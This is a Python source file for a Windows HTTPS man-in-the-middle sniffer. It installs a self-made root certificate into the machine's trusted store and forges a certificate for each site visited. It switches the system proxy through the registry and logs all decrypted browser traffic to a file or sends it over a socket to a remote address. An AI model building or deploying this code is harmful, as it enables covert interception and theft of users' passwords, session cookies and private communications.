from __future__ import annotations

import asyncio
import os
import pathlib
import logging
# import warnings


# os.environ['PYTHONASYNCIODEBUG'] = '1'
# logging.basicConfig(level=logging.DEBUG)
# warnings.resetwarnings()

from consts import *
import random
import ssl
from typing import Tuple, Optional, Union, TextIO
from mitm import MITM, middleware, Connection, protocol, crypto, __data__
from mitm.crypto import new_RSA
from mitm.crypto import crypto as cr
# from network import send
from socket import socket
from threading import Thread
# import sys
import winreg
from asyncio import CancelledError
import pathlib
# import certifi
from OpenSSL import crypto as cry

from network import send

my_socket: Optional[socket] = None
file: Optional[TextIO] = None
mitm: Optional[MITM] = None

installed_hosts = {}
ca_cert: cry.X509 | None = None
ca_key: cry.PKey | None = None


async def create_root_using_python(ca_path: str, country: str | None = "Is", state: str | None = PROJECT_NAME,
                                   organiztion: str | None = PROJECT_NAME, common_name: str = PROJECT_NAME):
    global ca_cert
    global ca_key
    ca_key = cry.PKey()
    ca_key.generate_key(cry.TYPE_RSA, 2048)

    ca_cert = cry.X509()
    ca_cert.set_version(2)
    ca_cert.set_serial_number(random.randint(50000000, 100000000))

    ca_subj = ca_cert.get_subject()
    ca_subj.commonName = common_name
    if country:
        ca_subj.C = country
    if state:
        ca_subj.ST = state
    if organiztion:
        ca_subj.OU = organiztion

    # ca_cert.add_extensions([
    #     cry.X509Extension(b"subjectKeyIdentifier", False, b"hash", subject=ca_cert),
    #     cry.X509Extension(b"authorityKeyIdentifier", False, b"keyid:always", issuer=ca_cert),
    #     cry.X509Extension(b"basicConstraints", False, b"CA:TRUE"),
    #     cry.X509Extension(b"keyUsage", False, b"keyCertSign, cRLSign"),
    # ])

    ca_cert.set_issuer(ca_subj)
    ca_cert.set_pubkey(ca_key)
    ca_cert.gmtime_adj_notBefore(0)
    ca_cert.gmtime_adj_notAfter(10 * 365 * 24 * 60 * 60)
    ca_cert.sign(ca_key, 'sha256')

    # Save certificate
    with open(f"{ca_path}.crt", "wb") as f:
        f.write(cry.dump_certificate(cry.FILETYPE_PEM, ca_cert))

    # Save private key
    with open(f"{ca_path}.key", "wb") as f:
        f.write(cry.dump_privatekey(cry.FILETYPE_PEM, ca_key))

    os.system(f"certutil -addstore root {ca_path}.crt")


async def new_pair_using_python(host: str, country: str = "Is", state: str = PROJECT_NAME,
                                organiztion: str = PROJECT_NAME):
    host_path = f"{CERT_FOLDER}\\{host}"
    client_key = cry.PKey()
    client_key.generate_key(cry.TYPE_RSA, 2048)

    client_cert = cry.X509()
    client_cert.set_version(2)
    client_cert.set_serial_number(random.randint(50000000, 100000000))

    client_subj = client_cert.get_subject()
    client_subj.commonName = host
    if country:
        client_subj.C = country
    if state:
        client_subj.ST = state
    if organiztion:
        client_subj.OU = organiztion

    san_list = [f"DNS:{host}"]
    client_cert.add_extensions([
        cry.X509Extension(
            b"keyUsage", False,
            b"Digital Signature, Non Repudiation, Key Encipherment"),
        cry.X509Extension(
            b"basicConstraints", False, b"CA:FALSE"),
        cry.X509Extension(
            b'extendedKeyUsage', False, b'serverAuth, clientAuth'),
        cry.X509Extension(
            b"subjectAltName", False, ", ".join(san_list).encode())
    ])

    # client_cert.add_extensions([
    #     cry.X509Extension("basicConstraints", False, "CA:FALSE"),
    #     cry.X509Extension("subjectKeyIdentifier", False, "hash", subject=client_cert),
    # ])
    #
    # client_cert.add_extensions([
    #     cry.X509Extension("authorityKeyIdentifier", False, "keyid:always", issuer=ca_cert),
    #     cry.X509Extension("extendedKeyUsage", False, "clientAuth"),
    #     cry.X509Extension("keyUsage", False, "digitalSignature"),
    # ])
    ca_subj = ca_cert.get_subject()
    client_cert.set_issuer(ca_subj)
    client_cert.set_pubkey(client_key)
    client_cert.gmtime_adj_notBefore(0)
    client_cert.gmtime_adj_notAfter(10 * 365 * 24 * 60 * 60)

    client_cert.sign(ca_key, 'sha256')

    # Save certificate
    with open(f"{host_path}.crt", "wb") as f:
        f.write(cry.dump_certificate(cry.FILETYPE_PEM, client_cert))

    # Save private key
    with open(f"{host_path}.key", "wb") as f:
        f.write(cry.dump_privatekey(cry.FILETYPE_PEM, client_key))


async def create_root(ca_path: str, country: str = "Is", state: str = PROJECT_NAME, organiztion: str = PROJECT_NAME,
                      common_name=PROJECT_NAME):
    pathlib.Path(ca_path).parent.mkdir(parents=True, exist_ok=True)
    os.system(f'openssl genrsa -out "{ca_path}.key" 4096')
    os.system(f'openssl req -x509 -new -nodes -key "{ca_path}.key" -sha256 -days 1024 '
              f'-subj "/C={country}/ST={state}/O={organiztion}/CN={common_name}" -out "{ca_path}.crt"')
    os.system(f'certutil -addstore root "{ca_path}.crt"')


async def new_pair2(host: str, country: str = "Is", state: str = PROJECT_NAME, organiztion: str = PROJECT_NAME):
    ca_path = f"{CERT_FOLDER}\\{ROOT_CA_NAME}"
    host_path = f"{CERT_FOLDER}\\{host}"
    with open(f"{host_path}.conf", "wt") as f:
        f.write(f"[req]\n"
                f"default_bits = 2048\n"
                f"prompt = no\n"
                f"default_md = sha256\n"
                f"req_extensions = req_ext\n"
                f"distinguished_name = dn\n"
                f"[dn]\n"
                f"C = {country}\n"
                f"ST = {state}\n"
                f"O = {organiztion}\n"
                f"emailAddress = flikhamud123@gmail.com\n"
                f"CN = {host}\n"
                f"[req_ext]\n"
                f"subjectAltName = @alt_names\n"
                f"[alt_names]\n"
                f"DNS.1 = {host}")
    os.system(f'openssl genrsa -out "{host_path}.key" 2048')
    os.system(f'openssl req -new -sha256 -key "{host_path}.key" '
              f'-subj "/C={country}/ST={state}/O={organiztion}/CN={host}" '
              f'-config "{host_path}.conf" '
              f'-out "{host_path}.csr"')
    # os.system(f'openssl req -out "{host_path}.csr" -newkey rsa:2048 -nodes -keyout "{host_path}.key" -config "{host_path}.conf"')
    # os.system(f'openssl req -noout -text -in "{host_path}.csr"')
    # os.system(f"openssl req -in {host}.csr -noout -text")
    os.system(f'openssl x509 -req -in "{host_path}.csr" '
              f'-CA "{ca_path}.crt" -CAkey "{ca_path}.key" -CAcreateserial -out "{host_path}.crt" -days 500 -sha256 '
              f'-extfile "{host_path}.conf" '
              f'-extensions req_ext'
              )
    # os.system(f"openssl x509 -in {host_path}.crt -text -noout")


async def create_crypto2(host: str):
    a = await new_pair2(host)
    # print(a)
    # context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
    # context.load_verify_locations(f"{CERT_FOLDER}\\{ROOT_CA_NAME}.crt")
    # context.load_cert_chain(certfile=f"{CERT_FOLDER}\\{host}.crt", keyfile=f"{CERT_FOLDER}\\{host}.key")
    install_cert(f"{CERT_FOLDER}\\{host}.crt")
    # os.remove(rsa_key)
    # os.remove(rsa_cert)

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=f"{CERT_FOLDER}\\{host}.crt", keyfile=f"{CERT_FOLDER}\\{host}.key")
    installed_hosts[host] = context


async def start_connection(connection: Connection, data):
    # # print("what")
    if b"CONNECT" in data:
        # print("whatttt")
        host = str(data[data.find(b" ") + 1: data.find(b":")])[2:-1]
        # print("OK")
    else:
        return
    # # print("Wow")
    if host not in installed_hosts:
        await create_crypto2(host)
    connection.ssl_context = installed_hosts[host]


class HttpsLogger(middleware.Middleware):
    @classmethod
    async def mitm_started(cls, host: str, port: int):
        await cls.write(f"MITM started on {host}:{port}.\n")
        # print("MITM started on %s:%d.\n" % (host, port))
        await create_root(f"{CERT_FOLDER}\\{ROOT_CA_NAME}")

    @classmethod
    async def client_connected(cls, connection: Connection):
        host, port = connection.client.writer._transport.get_extra_info("peername")
        await cls.write(f"Client {host}:{port} has connected.\n")
        # print("Client %s:%i has connected.\n" % (host, port))

    @classmethod
    async def server_connected(cls, connection: Connection):
        host, port = connection.server.writer._transport.get_extra_info("peername")
        await cls.write(f"Connected to server {host}:{port}.\n")
        # print("Connected to server %s:%i.\n" % (host, port))

    @classmethod
    async def client_data(cls, connection: Connection, data: bytes) -> bytes:
        await cls.write(f"Client to server: \n\n\t{data}\n")
        # print("Client to server: \n\n\t%s\n" % data)
        await start_connection(connection, data)
        return data

    @classmethod
    async def server_data(cls, connection: Connection, data: bytes) -> bytes:
        await cls.write(f"Server to client: \n\n\t{data}\n")
        # print("Server to client: \n\n\t%s\n" % data)
        return data

    @classmethod
    async def client_disconnected(cls, connection: Connection):
        await cls.write("Client has disconnected.\n")
        # # print("Client has disconnected.\n")

    @classmethod
    async def server_disconnected(cls, connection: Connection):
        await cls.write("Server has disconnected.")
        # # print("Server has disconnected.")

    @staticmethod
    async def write(info: str):
        raise NotImplementedError


class FileLog(HttpsLogger):
    @staticmethod
    async def write(info: str):
        file.write(info)


class NetLog(HttpsLogger):
    @staticmethod
    async def write(info: str):
        send(info, my_socket)


def set_reg(name, value, size):
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                      "Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0,
                                      winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, size, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError as e:
        # print(e)
        return False


def install_cert(host: str | None = None):
    if not host:
        return
    path = __data__.joinpath(f"mitm.crt") if not host else host
    os.system(f"powershell -c Import-Certificate -FilePath '{path}' -CertStoreLocation Cert:\LocalMachine\Root")


def filestart(path: str) -> bool:
    global file
    if file or my_socket:
        return False
    file = open(path, "wt")

    __start()
    # input("Press Enter to Stop...")

    # t = Thread(target=__start)
    # t.start()
    # install_cert()
    return True


async def netstart(address: Tuple[str, int]) -> bool:
    global my_socket
    if file or my_socket:
        return False
    my_socket = socket()
    my_socket.connect(address)

    __start()
    return True


def __start() -> bool:
    global mitm
    if my_socket and file:
        return False
    logger: Optional[type(middleware.Middleware)] = None
    if my_socket:
        logger = NetLog
    elif file:
        logger = FileLog
    else:
        return False

    # os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1')
    # sys.stdout.write("yes")
    if not set_reg("ProxyEnable", 1, winreg.REG_DWORD):
        return False
    # os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 127.0.0.1:8888')
    # sys.stdout.write("yes")
    if not set_reg("ProxyServer", "127.0.0.1:8880", winreg.REG_SZ):
        return False
    mitm = MITM(middlewares=[logger],
                host="127.0.0.1",
                port=8880,
                protocols=[protocol.HTTP],
                buffer_size=8192,
                timeout=5,
                ssl_context=None)
    try:
        mitm.run()
    except CancelledError:
        pass
        # print("Wow")
    return True


def stop_sniffing() -> bool:
    global my_socket, file
    if not mitm:
        return False
    mitm.stop()
    if my_socket:
        my_socket.close()
    if file:
        file.close()
    my_socket = None
    file = None
    # os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0')
    # sys.stdout.write("yes")
    set_reg("ProxyEnable", 0, winreg.REG_DWORD)
    return True



def main():
    filestart("logger.txt")
    # print("started")
    # input()
    # # time.sleep(3)
    # stop_sniffing()
    # # print("stopped")


if __name__ == "__main__":
    main()
